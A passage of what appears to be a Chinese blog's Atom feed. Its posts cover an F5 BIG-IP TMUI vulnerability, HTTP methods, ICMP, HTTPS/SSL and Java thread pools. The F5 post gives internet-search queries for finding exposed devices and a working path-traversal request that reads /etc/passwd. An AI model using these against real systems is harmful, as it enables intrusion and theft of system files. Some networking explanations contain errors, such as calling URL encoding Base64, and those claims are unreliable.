&lt;p&gt;&lt;code&gt;F5 BIG-IP&lt;/code&gt; 是美国&lt;code&gt;F5&lt;/code&gt;公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。&lt;/p&gt;

&lt;p&gt;在 &lt;code&gt;F5 BIG-IP&lt;/code&gt; 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞。&lt;/p&gt;

&lt;h1 id=&quot;影响版本&quot;&gt;影响版本&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;BIG-IP 15.x: 15.1.0/15.0.0&lt;/li&gt;
  &lt;li&gt;BIG-IP 14.x: 14.1.0 ~ 14.1.2&lt;/li&gt;
  &lt;li&gt;BIG-IP 13.x: 13.1.0 ~ 13.1.3&lt;/li&gt;
  &lt;li&gt;BIG-IP 12.x: 12.1.0 ~ 12.1.5&lt;/li&gt;
  &lt;li&gt;BIG-IP 11.x: 11.6.1 ~ 11.6.5&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;修复建议&quot;&gt;修复建议&lt;/h1&gt;

&lt;p&gt;升级到以下版本&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;BIG-IP 15.x: 15.1.0.4&lt;/li&gt;
  &lt;li&gt;BIG-IP 14.x: 14.1.2.6&lt;/li&gt;
  &lt;li&gt;BIG-IP 13.x: 13.1.3.4&lt;/li&gt;
  &lt;li&gt;BIG-IP 12.x: 12.1.5.2&lt;/li&gt;
  &lt;li&gt;BIG-IP 11.x: 11.6.5.2&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;目标搜索&quot;&gt;目标搜索&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;注：请将下面的%26替换为&amp;amp;&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;shodan&lt;/strong&gt;
 http.favicon.hash:-335242539&lt;/p&gt;

  &lt;p&gt;http.title:”BIG-IP%26reg;- Redirect”&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;fofa&lt;/strong&gt;
 title=”BIG-IP%26reg;- Redirect”&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;censys&lt;/strong&gt;
 443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5&lt;/p&gt;

  &lt;p&gt;443.https.get.title:”BIG-IP%26reg;- Redirect”&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;google&lt;/strong&gt;
 inurl:”tmui/login.jsp”&lt;/p&gt;

  &lt;p&gt;intitle:”BIG-IP” inurl:”tmui”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;漏洞检测&quot;&gt;漏洞检测&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp
/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=a
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;利用&quot;&gt;利用&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;测试结果&quot;&gt;测试结果&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/img/5902.png&quot; alt=&quot;5902&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP请求方法</title><link href="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" rel="alternate" type="text/html" title="HTTP请求方法" /><published>2020-07-05T00:00:00-04:00</published><updated>2020-07-05T00:00:00-04:00</updated><id>http://localhost:4000/_posts/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE。URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;主要方法&quot;&gt;主要方法&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;GET： 请求指定的页面信息，并返回实体主体。&lt;/li&gt;
  &lt;li&gt;HEAD： 只请求页面的首部。&lt;/li&gt;
  &lt;li&gt;POST： 请求服务器接受所指定的文档作为对所标识的URI的新的从属实体。&lt;/li&gt;
  &lt;li&gt;PUT： 从客户端向服务器传送的数据取代指定的文档的内容。&lt;/li&gt;
  &lt;li&gt;DELETE： 请求服务器删除指定的页面。&lt;/li&gt;
  &lt;li&gt;OPTIONS： 允许客户端查看服务器的性能。&lt;/li&gt;
  &lt;li&gt;TRACE： 请求服务器在响应中的实体主体部分返回所得到的内容。&lt;/li&gt;
  &lt;li&gt;PATCH： 实体中包含一个表，表中说明与该URI所表示的原内容的区别。&lt;/li&gt;
  &lt;li&gt;MOVE： 请求服务器将指定的页面移至另一个网络地址。&lt;/li&gt;
  &lt;li&gt;COPY： 请求服务器将指定的页面拷贝至另一个网络地址。&lt;/li&gt;
  &lt;li&gt;LINK： 请求服务器建立链接关系。&lt;/li&gt;
  &lt;li&gt;UNLINK： 断开链接关系。&lt;/li&gt;
  &lt;li&gt;WRAPPED： 允许客户端发送经过封装的请求。&lt;/li&gt;
  &lt;li&gt;Extension-mothed：在不改动协议的前提下，可增加另外的方法&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;get请求&quot;&gt;GET请求&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;根据HTTP规范，GET用于信息获取，而且应该是&lt;code&gt;安全的&lt;/code&gt;和&lt;code&gt;幂等的&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;所谓安全的意味着该操作用于获取信息而非修改信息。换句话说，GET 请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态&lt;/p&gt;

&lt;p&gt;幂等的意味着对同一URL的多个请求应该返回同样的结果。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;幂等&lt;/strong&gt;是一个数学或计算机学概念，常见于抽象代数中&lt;/p&gt;

  &lt;p&gt;对于单目运算，如果一个运算对于在范围内的所有的一个数多次进行该运算所得的结果和进行一次该运算所得的结果是一样的，那么我们就称该运算是幂等的。比如绝对值运算就是一个例子，在实数集中，有abs(a)=abs(abs(a))。对于双目运算，则要求当参与运算的两个值是等值的情况下，如果满足运算结果与参与运算的两个值相等，则称该运算幂等，如求两个数的最大值的函数，有在在实数集中幂等，即max(x,x) = x。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;post请求&quot;&gt;POST请求&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;根据HTTP规范，POST表示可能修改变服务器上的资源的请求&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;get和post区别&quot;&gt;get和post区别&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;GET在浏览器回退时是无害的，而POST会再次提交请求。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET产生的URL地址可以被Bookmark，而POST不可以。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET请求会被浏览器主动cache，而POST不会，除非手动设置。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET请求只能进行url编码，而POST支持多种编码方式。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET请求在URL中传送的参数是有长度限制的，而POST么有。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对参数的数据类型，GET只接受ASCII字符，而POST没有限制。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET参数通过URL传递，POST放在Request body中&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;　&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;GET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以&amp;amp;相连，如：login.action?name=hyddd&amp;amp;password=idontknow&amp;amp;verify=%E4%BD%A0%E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如：%E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。
POST把提交的数据则放置在是HTTP包的包体中
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;理论上讲，POST是没有大小限制的，HTTP协议规范也没有进行大小限制
POST的安全性要比GET的安全性高。注意：这里所说的安全性和上面GET提到的“安全”不是同个概念。上面“安全”的含义仅仅是不作数据修改，而这里安全的含义是真正的Security的含义，比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存，(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击。
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;总结一下，Get是向服务器发索取数据的一种请求，而Post是向服务器提交数据的一种请求，在FORM（表单）中，Method默认为&quot;GET&quot;，实质上，GET和POST只是发送机制不同，并不是一个取一个发
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">ICMP协议和ping命令</title><link href="http://localhost:4000/_posts/2020-07-05-ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4/" rel="alternate" type="text/html" title="ICMP协议和ping命令" /><published>2020-07-05T00:00:00-04:00</published><updated>2020-07-05T00:00:00-04:00</updated><id>http://localhost:4000/_posts/ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;p&gt;ICMP全称Internet Control Message Protocol，就是&lt;strong&gt;互联网控制报文协议&lt;/strong&gt;。
 ICMP 报文是封装在 IP 包里面的。因为传输指令的时候，肯定需要&lt;strong&gt;源地址&lt;/strong&gt;和&lt;strong&gt;目标地址&lt;/strong&gt;。它本身非常简单。因为作为侦查兵，要轻装上阵，不能携带大量的包袱&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/博客/verylazycat.github.io/img/ICMP&amp;amp;ping.png&quot; alt=&quot;ICMP&amp;amp;ping&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ICMP 报文有很多的类型，不同的类型有不同的代码。最常用的类型是主动请求为 8，主动请求的应答为0&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP和HTTPS</title><link href="http://localhost:4000/_posts/2020-07-04-HTTP%E5%92%8CHTTPS/" rel="alternate" type="text/html" title="HTTP和HTTPS" /><published>2020-07-04T00:00:00-04:00</published><updated>2020-07-04T00:00:00-04:00</updated><id>http://localhost:4000/_posts/HTTP%E5%92%8CHTTPS</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-04-HTTP%E5%92%8CHTTPS/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;http和https的基本概念&quot;&gt;&lt;strong&gt;Http和Https的基本概念&lt;/strong&gt;&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;Http：超文本传输协议（Http，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。设计Http最初的目的是为了提供一种发布和接收HTML页面的方法。它可以使浏览器更加高效。Http协议是以明文方式发送信息的，如果黑客截取了Web浏览器和服务器之间的传输报文，就可以直接获得其中的信息&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;http原理&quot;&gt;&lt;strong&gt;Http原理&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;① 客户端的浏览器首先要通过网络与服务器建立连接，该连接是通过TCP 来完成的，一般 TCP 连接的端口号是80。 建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是 MIME 信息包括请求修饰符、客户机信息和许可内容。&lt;/p&gt;

&lt;p&gt;② 服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是 MIME 信息包括服务器信息、实体信息和可能的内容&lt;/p&gt;

&lt;h2 id=&quot;https&quot;&gt;Https&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;是以安全为目标的Http通道，是Http的安全版。Https的安全基础是SSL。SSL协议位于TCP/IP协议与各种应用层协议之间，为数据通讯提供安全支持。&lt;/code&gt;SSL协议可分为两层：SSL记录协议（SSL Record Protocol），&lt;code&gt;它建立在可靠的传输协议&lt;/code&gt;（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。&lt;code&gt;SSL握手协议（SSL Handshake Protocol）&lt;/code&gt;，它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/SSL.png&quot; alt=&quot;SSL&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;https设计目标&quot;&gt;&lt;strong&gt;Https设计目标&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;(1)数据保密性：保证数据内容在传输的过程中不会被第三方查看。就像快递员传递包裹一样，都进行了封装，别人无法获知里面装了什么  。&lt;/p&gt;

&lt;p&gt;(2)数据完整性：及时发现被第三方篡改的传输内容。就像快递员虽然不知道包裹里装了什么东西，但他有可能中途掉包，数据完整性就是指如果被掉包，我们能轻松发现并拒收 。&lt;/p&gt;

&lt;p&gt;(3)身份校验安全性：保证数据到达用户期望的目的地。就像我们邮寄包裹时，虽然是一个封装好的未掉包的包裹，但必须确定这个包裹不会送错地方，通过身份校验来确保送对了地方  。&lt;/p&gt;

&lt;h1 id=&quot;https原理&quot;&gt;&lt;strong&gt;Https原理&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；&lt;/p&gt;

&lt;p&gt;② 服务器从算法列表中选择一种加密算法，并将它和一份包含服务器公用密钥的证书发送给客户端；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；&lt;/p&gt;

&lt;p&gt;③ 客户端对服务器的证书进行验证（有关验证证书，可以参考数字签名），并抽取服务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；&lt;/p&gt;

&lt;p&gt;④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 MAC密钥（参考 DH密钥交换算法） ；&lt;/p&gt;

&lt;p&gt;⑤ 客户端将所有握手消息的 MAC 值发送给服务器；&lt;/p&gt;

&lt;p&gt;⑥ 服务器将所有握手消息的 MAC 值发送给客户端。&lt;/p&gt;

&lt;h1 id=&quot;http与https的区别&quot;&gt;&lt;strong&gt;Http与Https的区别&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;1、https协议需要到CA  （Certificate Authority，证书颁发机构）申请证书，一般免费证书较少，因而需要一定费用。(原来网易官网是http，而网易邮箱是https。)&lt;/p&gt;

&lt;p&gt;2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。&lt;/p&gt;

&lt;p&gt;3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。&lt;/p&gt;

&lt;p&gt;4、http的连接很简单，是无状态的。Https协议是由SSL+Http协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。(无状态的意思是其数据包的发送、传输和接收都是相互独立的。无连接的意思是指通信双方都不长久的维持对方的任何信息。)&lt;/p&gt;

&lt;h1 id=&quot;https相对于http的改进&quot;&gt;&lt;strong&gt;Https相对于Http的改进&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;双向的身份认证&quot;&gt;双向的身份认证&lt;/h2&gt;

&lt;p&gt;客户端和服务端在传输数据之前,会通过基于X.509证书对双方进行身份认证 。具体过程如下：&lt;/p&gt;

&lt;p&gt;客户端发起 SSL 握手消息给服务端要求连接。&lt;/p&gt;

&lt;p&gt;服务端将证书发送给客户端。&lt;/p&gt;

&lt;p&gt;客户端检查服务端证书，确认是否由自己信任的证书签发机构签发。 如果不是，将是否继续通讯的决定权交给用户选择 ( 注意，这里将是一个安全缺陷 )。如果检查无误或者用户选择继续，则客户端认可服务端的身份。&lt;/p&gt;

&lt;p&gt;服务端要求客户端发送证书，并检查是否通过验证。失败则关闭连接，认证成功则从客户端证书中获得客户端的公钥，一般为1024位或者 2048位。到此，服务器客户端双方的身份认证结束，双方确保身份都是真实可靠的。&lt;/p&gt;

&lt;h2 id=&quot;数据传输的机密性&quot;&gt;数据传输的机密性&lt;/h2&gt;

&lt;p&gt;客户端和服务端在开始传输数据之前，会协商传输过程需要使用的加密算法。 客户端发送协商请求给服务端, 其中包含自己支持的非对成加密的密钥交换算法 ( 一般是RSA), 数据签名摘要算法 ( 一般是SHA或者MD5) , 加密传输数据的对称加密算法 ( 一般是DES),以及加密密钥的长度。 服务端接收到消息之后，选中安全性最高的算法，并将选中的算法发送给客户端，完成协商。客户端生成随机的字符串，通过协商好的非对称加密算法，使用服务端的公钥对该字符串进行加密，发送给服务端。 服务端接收到之后，使用自己的私钥解密得到该字符串。在随后的数据传输当中，使用这个字符串作为密钥进行对称加密。&lt;/p&gt;

&lt;h2 id=&quot;防止重放攻击&quot;&gt;防止重放攻击&lt;/h2&gt;

&lt;p&gt;SSL使用序列号来保护通讯方免受报文重放攻击。这个序列号被加密后作为数据包的负载。在整个SSL握手中,都有一个唯一的随机数来标记SSL握手。 这样防止了攻击者嗅探整个登录过程，获取到加密的登录数据之后，不对数据进行解密, 而直接重传登录数据包的攻击手法。&lt;/p&gt;

&lt;p&gt;可以看到，鉴于电子商务等安全上的需求，Https对比Http协议，在安全方面已经取得了极大的增强。总结来说，Https的改进点在于创造性的使用了非对称加密算法，在不安全的网路上，安全的传输了用来进行非对称加密的密钥，综合利用了非对称加密的安全性和对称加密的快速性。&lt;/p&gt;

&lt;h1 id=&quot;https的优点&quot;&gt;&lt;strong&gt;Https的优点&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;1、使用Https协议可认证用户和服务器，确保数据发送到正确的客户机和服务器。&lt;/p&gt;

&lt;p&gt;2、Https协议是由SSL+Http协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全，可防止数据在传输过程中不被窃取、修改，确保数据的完整性。&lt;/p&gt;

&lt;p&gt;3、Https是现行架构下最安全的解决方案，虽然不是绝对安全，但它大幅增加了中间人攻击的成本。&lt;/p&gt;

&lt;h1 id=&quot;https的缺点&quot;&gt;&lt;strong&gt;Https的缺点&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;1、Https协议握手阶段比较费时，会使页面的加载时间延长近。&lt;/p&gt;

&lt;p&gt;2、Https连接缓存不如Http高效，会增加数据开销，甚至已有的安全措施也会因此而受到影响。&lt;/p&gt;

&lt;p&gt;3、Https协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持等方面几乎起不到什么作用。&lt;/p&gt;

&lt;p&gt;4、SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。&lt;/p&gt;

&lt;p&gt;5、成本增加。部署 Https后，因为 Https协议的工作要增加额外的计算资源消耗，例如 SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本。&lt;/p&gt;

&lt;p&gt;6、Https协议的加密范围也比较有限。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。&lt;/p&gt;

&lt;h1 id=&quot;https的连接过程&quot;&gt;&lt;strong&gt;Https的连接过程&lt;/strong&gt;&lt;/h1&gt;

&lt;h1&gt;&lt;img src=&quot;/img/https.png&quot; alt=&quot;https&quot; /&gt;&lt;/h1&gt;

&lt;p&gt;①客户端的浏览器向服务器发送请求，并传送客户端SSL 协议的版本号，加密算法的种类，产生的随机数，以及其他服务器和客户端之间通讯所需要的各种信息。&lt;/p&gt;

&lt;p&gt;②服务器向客户端传送SSL 协议的版本号，加密算法的种类，随机数以及其他相关信息，同时服务器还将向客户端传送自己的证书。&lt;/p&gt;

&lt;p&gt;③客户端利用服务器传过来的信息验证服务器的合法性，服务器的合法性包括：证书是否过期，发行服务器证书的CA 是否可靠，发行者证书的公钥能否正确解开服务器证书的“发行者的数字签名”，服务器证书上的域名是否和服务器的实际域名相匹配。如果合法性验证没有通过，通讯将断开；如果合法性验证通过，将继续进行第四步。&lt;/p&gt;

&lt;p&gt;④用户端随机产生一个用于通讯的“对称密码”，然后用服务器的公钥（服务器的公钥从步骤②中的服务器的证书中获得）对其加密，然后将加密后的“预主密码”传给服务器。&lt;/p&gt;

&lt;p&gt;⑤如果服务器要求客户的身份认证（在握手过程中为可选），用户可以建立一个随机数然后对其进行数据签名，将这个含有签名的随机数和客户自己的证书以及加密过的“预主密码”一起传给服务器。&lt;/p&gt;

&lt;p&gt;⑥如果服务器要求客户的身份认证，服务器必须检验客户证书和签名随机数的合法性，具体的合法性验证过程包括：客户的证书使用日期是否有效，为客户提供证书的CA 是否可靠，发行CA 的公钥能否正确解开客户证书的发行CA 的数字签名，检查客户的证书是否在证书废止列表（CRL）中。检验如果没有通过，通讯立刻中断；如果验证通过，服务器将用自己的私钥解开加密的“预主密码”，然后执行一系列步骤来产生主通讯密码（客户端也将通过同样的方法产生相同的主通讯密码）。&lt;/p&gt;

&lt;p&gt;⑦服务器和客户端用相同的主密码即“通话密码”，一个对称密钥用于SSL 协议的安全数据通讯的加解密通讯。同时在SSL 通讯过程中还要完成数据通讯的完整性，防止数据通讯中的任何变化。&lt;/p&gt;

&lt;p&gt;⑧客户端向服务器端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知服务器客户端的握手过程结束。&lt;/p&gt;

&lt;p&gt;⑨服务器向客户端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知客户端服务器端的握手过程结束。&lt;/p&gt;

&lt;p&gt;⑩SSL 的握手部分结束，SSL 安全通道的数据通讯开始，客户和服务器开始使用相同的对称密钥进行数据通讯，同时进行通讯完整性的检验。&lt;/p&gt;

&lt;h1 id=&quot;ssl提供服务&quot;&gt;&lt;strong&gt;SSL提供服务&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;(1)认证用户和服务器，确保数据发送到正确的&lt;a href=&quot;https://baike.baidu.com/item/客户机&quot;&gt;客户机&lt;/a&gt;和&lt;a href=&quot;https://baike.baidu.com/item/服务器&quot;&gt;服务器&lt;/a&gt;；&lt;/p&gt;

&lt;p&gt;(2)加密数据以防止数据中途被窃取；&lt;/p&gt;

&lt;p&gt;(3)维护数据的完整性，确保数据在传输过程中不被改变。&lt;/p&gt;

&lt;h1 id=&quot;ssl工作流程&quot;&gt;&lt;strong&gt;SSL工作流程&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;服务器认证阶段&quot;&gt;服务器认证阶段&lt;/h2&gt;

&lt;p&gt;(1)客户端向服务器发送一个开始信息“Hello”以便开始一个新的会话连接；&lt;/p&gt;

&lt;p&gt;(2)服务器根据客户的信息确定是否需要生成新的主密钥，如需要则服务器在响应客户的“Hello”信息时将包含生成主密钥所需的信息；&lt;/p&gt;

&lt;p&gt;(3)客户根据收到的服务器响应信息，产生一个主密钥，并用服务器的公开密钥加密后传给服务器；&lt;/p&gt;

&lt;p&gt;(4)服务器回复该主密钥，并返回给客户一个用主密钥认证的信息，以此让客户认证服务器。&lt;/p&gt;

&lt;h2 id=&quot;用户认证阶段&quot;&gt;用户认证阶段&lt;/h2&gt;

&lt;p&gt;在此之前，服务器已经通过了客户认证，这一阶段主要完成对客户的认证。经认证的服务器发送一个提问给客户，客户则返回（数字）签名后的提问和其公开密钥，从而向服务器提供认证。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;SSL协议提供的安全通道有以下三个特性：&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;机密性：&lt;/strong&gt;SSL协议使用密钥加密通信数据。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;可靠性：&lt;/strong&gt;服务器和客户都会被认证，客户的认证是可选的。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;完整性：&lt;/strong&gt;SSL协议会对传送的数据进行完整性检查&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;服务器证书(server certificates)是SSL数字证书的一种形式，意指通过提交数字证书来证明您的身份或表明您有权访问在线服务。再者简单来说，通过使用服务器证书可为不同站点提供身份鉴定并保证该站点拥有高强度加密安全。是组成Web服务器的SSL安全功能的唯一的数字标识。通过相互信任的第三方组织获得，并为用户 提供验证您Web站点身份的手段。服务器证书包含详细的身份验证信息，如服务器内容附属的组织、颁发证书的组织以及称为公开密钥的唯一的身份验证文件&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">JAVA线程池</title><link href="http://localhost:4000/_posts/2020-07-02-JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0/" rel="alternate" type="text/html" title="JAVA线程池" /><published>2020-07-02T00:00:00-04:00</published><updated>2020-07-02T00:00:00-04:00</updated><id>http://localhost:4000/_posts/JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-02-JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果并发的线程数量很多，并且每个线程都是执行一个时间很短的任务就结束了，这样频繁创建线程就会大大降低系统的效率，因为频繁创建线程和销毁线程需要时间。那么有没有一种办法使得线程可以复用，就是执行完一个任务，并不被销毁，而是可以继续执行其他的任务？在Java中可以通过线程池来达到这样的效果&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;threadpoolexecutor类&quot;&gt;ThreadPoolExecutor类&lt;/h1&gt;

&lt;p&gt;&lt;code&gt;java.uitl.concurrent.ThreadPoolExecutor&lt;/code&gt;类是线程池中最核心的一个类，因此如果要透彻地了解Java中的线程池，必须先了解这个类。具体实现源码,在ThreadPoolExecutor类中提供了四个构造方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public class ThreadPoolExecutor extends AbstractExecutorService {
    .....
    public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,
            BlockingQueue&amp;lt;Runnable&amp;gt; workQueue);
 
    public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,
            BlockingQueue&amp;lt;Runnable&amp;gt; workQueue,ThreadFactory threadFactory);
 
    public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,
            BlockingQueue&amp;lt;Runnable&amp;gt; workQueue,RejectedExecutionHandler handler);
 
    public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,
        BlockingQueue&amp;lt;Runnable&amp;gt; workQueue,ThreadFactory threadFactory,RejectedExecutionHandler handler);
    ...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从上面的代码可以得知，ThreadPoolExecutor继承了AbstractExecutorService类，并提供了四个构造器，事实上，通过观察每个构造器的源码具体实现，发现前面三个构造器都是调用的第四个构造器进行的初始化工作。&lt;/p&gt;

&lt;p&gt;参数的含义：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;corePoolSize：核心池的大小，这个参数跟后面讲述的线程池的实现原理有非常大的关系。在创建了线程池后，默认情况下，线程池中并没有任何线程，而是等待有任务到来才创建线程去执行任务，除非调用了prestartAllCoreThreads()或者prestartCoreThread()方法，从这2个方法的名字就可以看出，是预创建线程的意思，即在没有任务到来之前就创建corePoolSize个线程或者一个线程。默认情况下，在创建了线程池后，线程池中的线程数为0，当有任务来之后，就会创建一个线程去执行任务，当线程池中的线程数目达到corePoolSize后，就会把到达的任务放到缓存队列当中；&lt;/li&gt;
  &lt;li&gt;maximumPoolSize：线程池最大线程数，这个参数也是一个非常重要的参数，它表示在线程池中最多能创建多少个线程；&lt;/li&gt;
